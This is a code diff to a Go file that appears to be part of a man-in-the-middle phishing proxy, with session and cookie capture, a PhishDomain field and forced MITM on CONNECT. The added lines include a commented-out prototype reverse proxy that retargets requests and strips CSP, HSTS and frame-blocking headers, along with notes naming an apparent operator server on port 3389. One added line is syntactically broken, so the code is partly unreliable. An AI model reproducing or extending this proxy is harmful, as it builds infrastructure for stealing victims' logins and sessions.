@@ -80,14 +80,99 @@ type ProxySession struct {
 	PhishDomain string
 	Index       int
 }
+/*
+package main
+import (
+        "github.com/dilshan23/goproxy"
+        "log"
+        "net/http"
+        //"time"
+        "net/url"
+        "fmt"
+)
+func main() {
+        proxy := goproxy.NewProxyHttpServer()
+        proxy.Verbose = true
+
+        var target string
+
+        proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {   //this is not calling ???
+        key := req.URL.Query()["url"]
+        if len(key) != 0 {
+
+                //url1, _ := session["url1"].(string)
+
+                //mu.Lock()
+
+                url1 := key[0]
+                fmt.Println(url1)
+
+                target = url1
+
+               }
+
+        })
+
+
+        proxy.OnRequest().DoFunc(
+                func(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+                        target1, _ := url.Parse(target)
+                        host := target1.Host
+
+                        //host := "www.118218.fr"
+                        //path := "/en/ad/honda-vezel-rs-2017-for-sale-colombo-534"
+                        log.Println(r.Header.Get("Host"))
+                        r.Header.Set("Host", host)
+                        r.Host = host
+                        r.URL.Host = host
+                        r.URL.Scheme = "https"
+                        //r.URL.Path = path
+                        return r, nil
+                })
+        proxy.OnResponse().DoFunc(
+                func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+                        if resp == nil {
+                                return nil
+                        }
+                var rm_headers = []string{
+                                "Content-Security-Policy",
+                                "Content-Security-Policy-Report-Only",
+                                "Strict-Transport-Security",
+                                "X-XSS-Protection",
+                                "X-Content-Type-Options",
+                                "X-Frame-Options",
+                        }
+                        for _, hdr := range rm_headers {
+                                resp.Header.Del(hdr)
+                        }
+                return resp
+                        })
+        http.Handle("/", proxy)
+        err := http.ListenAndServe(":8080", nil)
+        if err != nil {
+                log.Fatal(err)
+        }
+}
+
+*/
+
+
+
 
 
 // this method is used to modify HttpProxy structure's values or make a new object of it?..not being called form elsewhere //the returned modified HttpProxy struct is u
 //used by somewhere else
+
+//in my basic code i can use the nrepozy object instead of general one like this
+
+
+//http.Handle("/", NewHttpProxy)     --- >  http.Handle("/" ,proxy)   <----  proxy := goproxy.NewProxyHttpServer()
+ //err := http.ListenAndServe(":8080", nil)
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
-	p := &HttpProxy{
+	p := &HttpProxy{ //modifying only some fields
 		Proxy:             goproxy.NewProxyHttpServer(),
-		Server:            nil,
+		Server:            nil,      // listenandserve(http.Handle("/", proxy)(":8080", nil)
 		crt_db:            crt_db,
 		cfg:               cfg,
 		db:                db,
@@ -99,7 +184,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
-
+//this block is important --overriding server --hostname xaraapi.xyz or ip address of ours port 3389
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
 		Handler:      p.Proxy,
@@ -117,13 +202,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = GenRandomString(4)
+	p.cookieName = GenRandomString(4) //modefiying HttpProxy structs cookie value
 	p.sessions = make(map[string]*Session)
-	p.sids = make(map[string]int)
+	p.sids = make(map[string]int)Name 
 
 	p.Proxy.Verbose = false
 
-	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {  //going one leverl deep goproxy.NewProxyHttpServer() --> NonproxyHandler
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
@@ -131,7 +216,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
-	p.Proxy.OnRequest().
+	p.Proxy.OnRequest().   // ----> same as proxy.OnRequest in my code ---> this implies code should be assosiated with NonProxyhandler 
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
 				SessionId:   "",
